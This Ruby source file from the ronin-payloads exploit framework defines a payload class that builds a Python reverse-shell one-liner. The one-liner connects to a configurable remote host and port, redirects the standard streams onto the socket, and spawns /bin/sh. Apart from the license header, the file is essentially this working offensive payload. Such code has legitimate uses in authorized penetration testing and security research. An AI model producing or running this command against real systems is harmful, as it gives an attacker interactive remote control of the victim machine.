# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/command_payload'
require 'ronin/payloads/mixins/reverse_shell'
require 'ronin/support/network/dns'

module Ronin
  module Payloads
    module CMD
      module Python
        #
        # A basic `python` reverse shell command.
        #
        class ReverseShell < CommandPayload

          include Mixins::ReverseShell

          register 'cmd/python/reverse_shell'

          description <<~DESC
            A basic `python` reverse shell command.
          DESC

          #
          # Builds the `python` reverse shell command.
          #
          def build
            @payload = %{python -c 'import socket,os,pty;s=socket.socket();s.connect((#{host.dump},#{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'}
          end

        end
      end
    end
  end
end
